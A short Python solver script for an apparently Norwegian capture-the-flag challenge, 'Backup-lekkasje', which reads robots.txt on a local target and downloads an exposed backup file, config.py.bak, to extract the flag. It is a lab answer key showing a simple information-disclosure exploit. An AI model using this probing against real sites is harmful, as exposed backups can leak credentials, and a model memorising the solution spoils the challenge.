#!/usr/bin/env python3
"""Solver for Backup-lekkasje."""

from __future__ import annotations

import re
import sys

import requests


BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080"


def main() -> None:
    robots = requests.get(f"{BASE}/robots.txt", timeout=5).text
    print("[*] robots.txt")
    print(robots.strip())

    backup = requests.get(f"{BASE}/backup/config.py.bak", timeout=5).text
    match = re.search(r"CTF\{[^}]+\}", backup)
    if not match:
        raise SystemExit("Fant ikke flagg i backupfilen")

    print(f"\n*** FLAGG: {match.group(0)} ***")


if __name__ == "__main__":
    main()

